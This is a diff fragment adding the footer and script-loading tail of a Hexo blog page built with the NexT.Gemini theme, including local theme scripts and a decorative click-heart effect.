+  <span class="author" itemprop="copyrightHolder">kangel</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 --> <script type="text/javascript" src="/js/src/love.js"></script>
